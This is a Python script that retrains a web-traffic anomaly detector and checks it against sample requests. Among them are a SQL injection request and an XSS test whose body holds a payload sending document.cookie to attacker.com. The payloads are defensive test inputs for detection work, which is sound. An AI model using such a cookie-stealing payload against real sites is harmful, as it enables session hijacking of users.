#!/usr/bin/env python3
"""
Retrain Anomaly Detector with Enhanced Features

Regenerate training data with 25 features (18 original + 7 enhanced)
"""

import json
import os
from ml.anomaly_detector import AnomalyDetector
from ml.training_data_generator import TrainingDataGenerator


def retrain_anomaly_detector():
    """Generate normal behavior data and retrain anomaly detector."""
    
    print("="*80)
    print("RETRAINING ANOMALY DETECTOR WITH ENHANCED FEATURES")
    print("="*80)
    
    # Start from a clean model so we know this run produced the artifact.
    model_path = os.path.join('ml', 'models', 'anomaly_detector.pkl')
    if os.path.exists(model_path):
        os.remove(model_path)
        print(f"\nRemoved existing model: {model_path}")

    # Generate normal behavior data
    print("\nGenerating normal behavior data (500 samples)...")
    generator = TrainingDataGenerator()
    normal_data = generator.generate_anomaly_training_data(num_samples=500)
    
    print(f"✅ Generated {len(normal_data)} normal samples")
    
    # Initialize detector
    print("\nInitializing anomaly detector...")
    detector = AnomalyDetector()
    
    # Train
    print("Training model on normal behavior patterns...")
    results = detector.train(normal_data, contamination=0.08)
    
    # Print results
    print("\n" + "="*80)
    print("TRAINING RESULTS")
    print("="*80)
    
    if 'error' in results:
        print(f"❌ Error: {results['error']}")
        return False
    
    print(f"\n✅ Training successful!")
    print(f"   Samples trained: {results.get('samples_trained', 'N/A')}")
    print(f"   Normal samples: {results.get('normal_samples', 'N/A')}")
    print(f"   Anomalies detected: {results.get('anomalies_detected', 'N/A')}")
    print(f"   Model saved to: {results.get('baseline_stats', {}).get('sample_count', 'N/A')} samples")
    
    print("\n📊 Baseline Statistics:")
    baseline = results.get('baseline_stats', {})
    print(f"   Avg response time: {baseline.get('avg_response_time', 0):.0f}ms")
    print(f"   Std response time: {baseline.get('std_response_time', 0):.0f}ms")
    print(f"   Common status codes: {baseline.get('common_status_codes', [])}")
    
    # Test the model
    print("\n" + "="*80)
    print("TESTING RETRAINED MODEL")
    print("="*80)
    
    # Test 1: Normal request
    normal_test = {
        'request': {
            'url': 'http://localhost:8998/login/index.php',
            'method': 'GET',
            'headers': {'User-Agent': 'Mozilla/5.0'},
            'body': ''
        },
        'response': {
            'status_code': 200,
            'size': 5000,
            'time': 150,
            'headers': {}
        },
        'request_count_last_minute': 5,
        'unique_ips_last_minute': 3,
        'error_rate_last_minute': 0
    }
    
    is_anomaly, score, reason = detector.detect(normal_test)
    print(f"\nTest 1 - Normal Request:")
    print(f"  Is Anomaly: {is_anomaly}")
    print(f"  Score: {score:.2f}")
    print(f"  Reason: {reason}")
    
    # Test 2: Suspicious request with SQL injection payload
    suspicious_test = {
        'request': {
            'url': 'http://localhost:8998/admin?id=1 OR 1=1',
            'method': 'GET',
            'headers': {'User-Agent': 'sqlmap/1.6.0'},
            'body': 'SELECT * FROM users'
        },
        'response': {
            'status_code': 500,
            'size': 100,
            'time': 5000,
            'headers': {}
        },
        'request_count_last_minute': 150,
        'unique_ips_last_minute': 1,
        'error_rate_last_minute': 0.8
    }
    
    is_anomaly, score, reason = detector.detect(suspicious_test)
    print(f"\nTest 2 - Suspicious Request (SQL Injection):")
    print(f"  Is Anomaly: {is_anomaly}")
    print(f"  Score: {score:.2f}")
    print(f"  Reason: {reason}")
    
    # Test 3: XSS attempt
    xss_test = {
        'request': {
            'url': 'http://localhost:8998/forum?post=<script>alert("XSS")</script>',
            'method': 'POST',
            'headers': {'User-Agent': 'Mozilla/5.0'},
            'body': '<img src=x onerror="fetch(\'http://attacker.com?c=\'+document.cookie)">'
        },
        'response': {
            'status_code': 200,
            'size': 5000,
            'time': 200,
            'headers': {}
        },
        'request_count_last_minute': 10,
        'unique_ips_last_minute': 2,
        'error_rate_last_minute': 0.05
    }
    
    is_anomaly, score, reason = detector.detect(xss_test)
    print(f"\nTest 3 - XSS Attack:")
    print(f"  Is Anomaly: {is_anomaly}")
    print(f"  Score: {score:.2f}")
    print(f"  Reason: {reason}")
    
    print("\n✅ Anomaly detector retrained and tested successfully!")
    return True


if __name__ == '__main__':
    import sys
    success = retrain_anomaly_detector()
    sys.exit(0 if success else 1)
